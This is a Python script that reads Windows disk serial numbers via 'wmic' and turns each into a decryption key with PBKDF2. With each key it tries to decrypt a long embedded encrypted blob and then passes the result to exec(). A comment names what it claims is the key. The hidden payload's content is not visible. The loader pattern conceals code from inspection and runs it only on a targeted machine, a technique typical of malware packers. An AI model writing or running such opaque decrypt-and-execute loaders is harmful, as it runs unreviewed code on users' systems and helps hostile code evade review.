import subprocess
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import cryptography
import base64
import random
from cryptography.fernet import Fernet
print("--ATTEMPTING TO AUTHENTICATE WITH DISKDRIVE --")

serials = subprocess.check_output('wmic diskdrive get SerialNumber').decode().split('\n')[1:]
serials = [s.strip() for s in serials if s.strip()]
capacities = subprocess.check_output('wmic diskdrive get Size').decode().split('\n')[1:]
capacities = [c.strip() for c in capacities if c.strip()]
deviceIDs = subprocess.check_output('wmic diskdrive get PNPDeviceID').decode().split('\n')[1:]
deviceIDs = [d.strip() for d in deviceIDs if d.strip()]
status = subprocess.check_output('wmic diskdrive get Status').decode().split('\n')[1:]
status = [s.strip() for s in status if s.strip()]


#ClJBFQAVY7x0BxC-oIOyKlJYvxcFZMpTDIbMcWnTB2c= is key

random.shuffle(serials)
for serial in serials:
  kdf = PBKDF2HMAC(
      algorithm=hashes.SHA256(),
      length=32,
      salt=b'thesalt',
      iterations=3000000,
      backend=default_backend()
  )
  key = base64.urlsafe_b64encode(kdf.derive(serial.encode()))
  print("Attempting "+key.decode())
  f = Fernet(key)
  try:
    filedata = 'gAAAAABiyg5oP27GvonKzHhHkXrRKlveL9rdkj9u2hOSNDXQ2NqpV_9gfgfYnQo4MN5EAIekSCOJXR_ACZ3-ceQ0YwYWvMjVTW99mTB1yZtW_XyfTqTqfhdWws2od8e0BBh7PXbxjNO_2jfngLRCZsqfkIcmQaSwomCrUL8KHNuk6nxVvEvh9MTqQD9eFAtfI9USrnSJCxowcWCB_GvV1u2QcwuAXtQJnyQ8oONikFKoxhtZsUb7wek1QdrxBNTvDfpSnZT1tsWMJhK5VJeWPj-ax2SZeKj4fYkzwfuoctERSD0RAd9DM7vrt0vyRJEcQ2lmbKD0k34Jw7Skq3ck63VyIHBBE70A--_w0VL5aOkzMYJW1_C5GJjNSeSrdoxsiQXhpk8k6ggnihxapM3jwJKVuGbnbeSoH3qsrZ380NiH15-ubdgYg_PirvByvwyVQL6jVCMK0jeomZUekpNAmeXOdhZg3JK_hYOyCfsGVG59m9AvnHheO3Agg1mw0COD0GNTuvFGUdXqQG4_XxjfOvWB-X1lmlx7QDcQwpcLakq89p6dcADts-C8gmLqRfP3SpV04LZSbJq9fZceYOznUKruU5lINjP0YYhn5Zvoy8mrsDbAmtxgaPGRhbUAau0vJ2pk7gkDwf9OmLscUnfya3XXqLKPqAvPxBkFFQrNVY_COBwYJWvI2k68nIiKvs31xvmguV8_bqe3OuxBMvsNENICyE_dbxklWI2WAEoJhwBf_KNuEyuNXezUbqpN8RdmdFkV2mmLIUw7xYlcXgGxrT4W1hWPJ_wn0gieaxLB1azpyMGrLiR-Rltg8GelKemDGVbSFo4GHiZUxWp0OhAHMRjvqsUCOM3nPlhHvv1IuKsArXFF5nhSuvNUv6c2rW0XGsCqko6Ksy8tpNh2Tnwm2ZvyvVVvoKdN7NCMRyhn5Elt1DS-FazdOZz8Ka8NRPJXEQ76f16PX4v1_B2ZkNYwk0SuFlocZCjtjuMbxvPBF9rrBhcFN1ojmdmEc18NcH4rNt6ylymzKOStu9E3lI36kCq7yaw9HvE2IzRFwiUf7QcAJSe1KqdgXJC1nSP6GTsLmtQmXTA2yMvpYvTYVJpsWgGHkdeqcNaKQui4-Qi1iCJUlrEn8OEfs3p7QqJ-GJR65QaFEPSiGsV6EVMYYBJChMhohdLsAUdiS12AN8qWdjz4-TvbdelMDLu2AdzJFWTbQQLJPemlkIyM9l8pzQryirps9M8SlRLik1sbeCP01SAE9loN4L0HAmpeyB4iGF74h1qc5AqEU2EucIjkMrkLv4oSoTrwtC-Qz1P6_MIWnanXHn6NPuu6rgf0XHgXFxpYsT1NU50ydiFe47sUy7EPQUJ1Rw6Wm3ZiglTTpukxMRnOqSzuDAVqrI7B1DOMTvsrjylf9FeBAon4sW5vnFS0b5eMqcP-WjwRHixjf3ztLMRQsupK0cq2tVjvX4ZVcYUXebNJBZwmuyYptPUHj9aoR8yY63HiKROSuhSDTfJJzVMW4ODdf-8ntdjNtjyzpNp-RbaLrgiqN9xmg0_7fTCu_tS8Mz0GbxMNY_WJYmUcPRb6jTW2tNdBOd7FgF3_AwAyqOKk_QbbdX5CTvrsw0WIqkgIUDrySuC_D5MWGxOdiiDgVAOWxTrfbkDLhdvgsXHIKEJlr_66L9a5HP3H11leSrMIGxC_mJaF13jJYOqESk0qVhLVLAbdZZB4qLiAhnkSzBeYl_H27mWfLrzzUJu_AOA0OjAttf5-XzGbV0OvEudUTGum7W2JES-zOaK1k71oudpx4pf2eE9KBHeijX3XM5ot9xG1zWn_4CA0Dq5x_onCPQZceHxoN__Wmg3VvtJ7ggu9Rp-hagu3E0jctTn2crdWNKw1kELqB_usjVB45puVLsi7Mk7p3zK_hGpwuGBxYHEKp18xeZ7EtPWnR7Ngp1O2Bic8M-OpHXnXedv81tWm0gDcvZQywzZX6Z0NB0MIR8oLn24CyV_wYdveqXC8Od_1kif1sF8N6WuY3RCsVTFBB_xvJBC6m7bXA7mISY0-dyHAXh_X5nIJLhcWTCX7i5friOIe_B0jpEtrTuKrs0TtZii0TOtdcXcE0e-TObBAkqy83yjaco0NvUvyDcl4_iFTzeujq2MdhNPP6xEEzbuIS2KPaH1P5IgrF5Q6FX6ieMWdql7xHpJXv3LWO3tAIuzNNv61R-QUIq9C3Sgsc9OtbOlzQNFgp9-8feRE6bPgtOm4ldX0v7vV1W79wIDztpj1su4y5nEoGeBVPYv0jV5K_gOGzsq7cNxUEm_HSWUZ69dGZxsbNSqlpwxyjHkmuFVJ1sWuOG_F7SqPdzfhxS4esGYD-tWNjGx_W_ZWURb0b_j4i4BJw-yxDK4jDVrnTZNrVC0uC22aIQLeTitZNwvVVpO15liUlXOJtncmYauae7bpH3NGba9CepGNZ6vaIHUpXk_IkjKnIOKl1KOwTcUQZ07HVy6OYjHaCXH4vbmaSF-isFZ0F9zz3KH1Cy4i-X4Xl31P0GbSRCGHI6M1kNZXPmJM_hawI8HkLTKTQR1chSdsui52yH_GbV1AI5QN7BNKgcgmwpyQw9uRuNM_1cxeAwcOtv_W2C9jpkdQ9c2g1RosJT6zXz56CZ-vKXfLP8aZ536ejWzRqf0K1H64jSTQEfowag17da-U3zyY_b67jfptC-lyGDU4v9REmE2SVztOC5qtm08pkYbTtDf74m7QH6s9W0PtTPzuFXjBGPejVLhk_eACqyW58CpKbdn_KO8XXVNrp7nBKSRk9b-uwBebhlSlRPNjWvxOt6HHht8mo4hkDYrVtShhsuAuZflWfvz_2hLM3IG0ELDhA_E4cH7QSyM8I8eFl5XCjYU6z3w4VrkeogdH1RjMBlL8LGWUfCpcx0c_sBspk1_qEcYnKRIVqOQJM-SPgiG-4FK59n_nYlAOo5_dEE---5ilWuBFvJla83OQLGgYo6DUPwq-GjpnTEG42SXhY-lHpXeA-lU-KDJaTVF0mMjdgsW5xe-ktmoUQc0UB7FaA4nproddywNXHieB2evQcd_Q9GNu4sLJePc7IpGej2ZnU_LHf3e1hLjn1oHooUaT7ZLoSK13T14-VuXlgAmrP85BbCytrKG1nSnPkEJHQCBnQZIUF5kuGw0xqrUhyaCgck3h0DdflfjC5hRoY0To2S3RF4Ydj__5U-_StMgD30S8ZMaLqrBlyCz75e56pFPAsRnllMp5krz_cFk2pkmNNfEFJ0gxFOpSaQQfUrz6N1XSCRNGAFg3sJ_DQwHpw_2yR5GMYfLQptJIAp1-8xQ8ZwqTa_3xojvHzzV2OnYV60nOm7fLHD_sgWCeRtXORlapFFlvATjYwN1y-w36RXzLmyZ6KeNLx9mJs14u__RigjnQSLEspw0oW759ptF3M0GTO3nIC8X49efU-iWRhGv9ZT3nvoRNjxuhkJg8SfJJlyjzhw8UWy6dI_Uf05qpLHOuIuX9_gTHvbUZ9oapzAHkpDXFUhAhZLgfMjTeO1MP5BzRCpmCuyBIzx_xkth3jghLRq1O0NrbikMrjCvVNRghFUiypEbdNXDMy1YoiE_bXJ7aszaDDAra__71w7KCLNNbBIgtWLS0kIrXqKBKP4DXKjlxedwJ_2s62KHg3ZLte7Dogr8QlNomE1Qtk47Yo_gmVAf2TEl0-03QiEoDXCUHB8I_H8Osjo6sHxhjNRS_VRvKA-eLG8zJkyVqCspJ-u49gRa6VOEzIDkdiZ5SQDsmuAIyNiCOdWsVkBgE2etNE18tVSx2NtAvNfdmO-Pl6nJGxP2hu-8le31Vml1z_z-yrYdiTraZi-c8lFbGJLUE-ZaLN9nytgsHJbJtSygNgj0pEA=='
    decrypted = f.decrypt(filedata.encode()).decode()
    print("Success.")
    del f
    exec(decrypted)
    break
  except cryptography.fernet.InvalidToken:
    print("Failed.")